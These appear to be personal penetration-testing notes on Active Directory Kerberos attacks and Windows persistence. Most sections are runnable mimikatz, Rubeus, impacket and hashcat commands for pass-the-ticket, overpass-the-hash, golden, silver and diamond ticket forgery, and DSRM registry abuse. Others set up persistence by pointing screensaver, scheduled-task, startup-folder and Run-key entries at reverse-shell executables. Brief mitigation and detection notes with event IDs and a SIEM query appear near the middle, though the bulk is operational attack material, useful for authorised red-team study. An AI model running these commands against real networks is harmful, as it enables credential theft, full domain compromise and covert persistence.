	

#### Pass the ticket :
Using a stolen Kerberos ticket (TGT or service ticket) to authenticate to services without needing the user's password or hash.
```bash
#using the mimikatz.exe
kerberos::list
kerberos::list /export

kerberos::ptt ticket.kirbi
misc::cmd

#using the Rubeus
Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /rc4:f56a8399599f1be040128b1dd9623c29 /ptt

dir \\<domain-ip>\C$ 
PsExec.exe \\192.168.1.105 cmd.exe

Rubeus.exe ptt /ticket:golden.kirbi

#using impacket-getTGT
impacket-getTGT -dc-ip 192.168.154.134 Marvel.local/hawkeye

export KRB5CCNAME=hawkeye.ccache

impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/hawkeye@THE-PUNISHER.MARVEL.local


#use windows check ticket is available 
klist
klist /purge #delete
```


#### Over Pass the ticket (PTH + PTT) :
You're generating a fresh TGT using the hash, then you can pass it — so it’s a hybrid of pass-the-hash and pass-the-ticket.
```bash
#mimikatz:
sekurlsa::pth /user:Administrator /domain:Marvel.local /ntlm:f56a8399599f1be040128b1dd9623c29 

#using rubeus
Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /ntlm:f56a8399599f1be040128b1dd9623c29 /nowrap
Rubeus.exe ptt /ticket:<ticket base64 value>


#using getTGT
impacket-getTGT -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator

export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/Administrator@THE-PUNISHER.marvel.local
```


#### Golden ticket attack :
A Golden Ticket attack is a powerful post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the stolen hash of the KRBTGT account in Active Directory. This forged ticket gives the attacker unrestricted access to any resource in the domain — allowing them to impersonate any user, including domain admins, and maintain persistent control.
```bash
#requirements
kbrtgt:hash
SID of kbrtgt (nxc ldap 192.168.154.134 -u fcastle -p Password@123 --get-sid)
Domain name 
impersonate-user

Domain SID → can be found with whoami /user or Get-ADDomain.
KRBTGT account hash → NTLM or AES (from secretsdump.py or DCSync).
Domain name (FQDN) → e.g. MARVEL.LOCAL.
Target user → usually Administrator.


impacket-lookupsid ignite/Administrator:Ignite@987@192.168.1.105
python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -user-status

#using ticketer
impacket-ticketer -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local Administrator
export KRB5CCNAME=/root/Tools/impacket/examples/Administrator.ccache

export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/Administrator@THE-PUNISHER.marvel.local

#convert and transfer the kribi file to windows computer.
impacket-ticketConverter /root/impacket/examples/Administrator.ccache golden.kirbi

#use Rubeus.exe pass the the ticket.
Rubeus.exe ptt /ticket:golden.kirbi


#mimikatz :
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt



```

#### Silver ticket attack :
With golden ticket attack, we used the hash of a krbtgt account whereas in the case of the silver ticket attack we will use the password hash of a service account. The password hash of the service account can be extracted by various methods, Kerberoasting being one. Since no intermediary TGT is required for the silver ticket attack to work, silver tickets can be forged without any communication with a Domain Controller and hence is stealthier than golden ticket attack.

```bash
#requirements 
Service hash <perform kerberoasting or use >
Service name <get from kerberoasting attack>
Target FQDN 
Domain SID  <whoami /user>


rubeus.exe kerberoast /domain:ignite.local /creduser:ignite.localaarti /credpassword:Password@1 /nowrap

hashcat -m 13100 '$krb5tgs$23$*sqluser$ignite.local$MSSQLSvc/dc1.ignite.local:1433@ignite.local*$..<snipped>...4297093077601CC' /usr/share/wordlists/rockyou.txt --force
rubeus.exe hash /password:Password@1


rubeus.exe silver /service:MSSQLSvc/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /sid:S-1-5-21-2377760704-1974907900-3052042330 /user:harshitrajpal /domain:ignite.local /ptt


using ticketer:
impacket-ticketer -nthash c6ba25c393c4e412825e6c476c7f2e12 \ 
            -domain-sid S-1-5-21-1730870759-634495401-3117737333 \
            -domain MARVEL.LOCAL \
            -spn cifs/HYDRA-DC.marvel.local \
            administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient MARVEL.LOCAL/Administrator@HYDRA-DC.marvel.local -k -no-pass
```


#### Domain Persistence: DSRM
A domain controller includes two Administrator accounts. LSASS manages the “AD Administrator Account,” which administrators use to log in to the domain controller. The system stores the other, a hard-coded “Local Administrator Account,” in its SAM database.

All domain controllers have a hard-coded local Administrator account stored in their SAM file. Typically, this account and local database are not used or generally available when the domain controllers are running normally.
```bash
privilege::debug
token::elevate

#get the lsa and sam password and domain , domain controller administration account
lsadump::sam
lsadump::lsa /patch

#look for this registry value
DsrmAdminLogonBehaviour : 2

#check the registry 
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"

if value = 0 so it's not working

#set the registry value
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose

New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#use sam password for pass the hash
privilege::debug
sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38



#mitigation
Check & monitor the DsrmAdminLogonBehaviour value is not set to 2 inside the Registry key.
DSRM passwords are changed regularly at least once a month.

ntdsutil
set dsrm password
reset password on server null
# it will prompt for new password and confirmation
q
q
```


### Diamond Ticket  Attack:
**Diamond Attack**, the attacker leverages the **KRBTGT AES hash** to **decrypt a valid TGT (Ticket Granting Ticket)**. Then, they **modify the PAC (Privilege Attribute Certificate)** inside the TGT before **re-encrypting** the modified TGT with the **KRBTGT AES hash** again to make it appear **legitimate**.

 This attack is essentially a **TGT modification attack**. The attacker doesn’t need to steal the original TGT or create a completely new one; instead, they simply manipulate the PAC within an existing TGT

-

```bash
- KRBTGT Account Hash: Essential for decrypting and re-encrypting TGTs.
- AES256 Key: Often required to modify PACs embedded within TGTs.
- Administrative Access: Initial access to a high-privilege account to extract cryptographic material.
  
#collect prequest
impacket-secretsdump MARVEL.local/hawkeye:@192.168.154.134 -just-dc-user krbtgt
nxc ldap 192.168.154.134 -u fcastle -p Password@123 --get-sid
Get-ADUser fcastle -Properties SID

  
  
#let's create ticket.
impacket-ticketer -request -domain 'MARVEL.local' -user 'fcastle' -password 'Password@123' -nthash 'c90bf74688c024687385328ca2616f5b' -aesKey '9c8112d6397758b1c23debf624c5bb655ae10ed793d2f224bd878005ad451d78' -domain-sid 'S-1-5-21-3614020701-506922700-4184706594' fcastle

#using the ticket .
export KRB5CCNAME=sanjeet.ccache; impacket-psexec ignite.local/sanjeet@dc.ignite.local -dc-ip 192.168.1.48 -target-ip 192.168.1.48 -k -no-pass

#using the rubeus and mimikatz .
privilege::debug
lsadump::dcsync /domain:Marvel.local /user:krbtgt

.\Rubeus.exe diamond /tgtdeleg /ticketuser:fcaslte /ticketuserid:1107 /groups:512 /krbkey:<aes key>

rubeus.exe asktgs /ticket: <paste the above copied ticket> /service:cifs/dc.ignite.local /ptt /nowrap

dir \\dc.ignite.localc$


#detection
4769 (Service Ticket Request): Detects forged TGT use. Indicators: Unusual account names, high privileges (e.g., Domain Admins), and requests from abnormal IPs.
4624 (Successful Account Logon): Look for Logon Type 3 (network logons) from unexpected hosts or elevated privileges for non-admin accounts.
4678 (Privileges Assigned to Logon): Detects special privileges (e.g., SeDebugPrivilege) assigned to non-privileged accounts.
4713 (Kerberos Policy Changed): Flags changes to ticket lifetimes or other Kerberos policies.
4625 (Failed Logon): Repeated failures for privileged accounts or from suspicious IPs.
Detection Strategies

Ticket Lifetime: Compare Ticket Lifetime in Event ID 4769 with policy norms to spot anomalies.
Privilege Correlation: Track elevated privileges or sensitive SPN access by standard users.
Unusual Encryption Types: Detect rarely used encryption like RC4 in Event ID 4769.
TGT Usage: Monitor for identical TGTs used across multiple IPs or locations.


SIEM search query :
| search ServiceName IN ("Domain Admins", "Enterprise Admins")
| stats count by AccountName, IPAddress, ServiceName
| where count > 5

```


### Screensaver Hijack
if the windows idle for 1 minute you will see bubble,line or blank screen as you configure in screensaver. if leverages the screen scrnsave.exe add the our payload.
```bash
#Add new registry key
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\Administrator\Downloads\shell2.exe

#Replace existing registry key.
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\Users\Administrator\Downloads\shell1.exe'

#delete the registry key
reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f
```

### Modify shortcuts 
![[Pasted image 20251006001827.png]]

### Using Task Schedular
```bash
#create task
schtasks /create /tn "SystemCleanup" /tr "C:\users\fcastle\Downloads\reverse.exe" /sc daily /st 09:00 /ru System

#delete task
schtasks /delete /tn "SystemCleanup" /f
```

### Using Shell Startup
```bash
Win+R

shell:startup

Place your payload and hide with attrib command if you want
```


### Registry AutoRun
```bash
#add autorun script from command line 
C:\Users\tcm\Downloads>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
/v "NotABackdoor" /t REG_SZ /d "C:\Users\fcastle\Downloads\reverse.exe" /f

#delete registry key
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotABackdoor" /f
```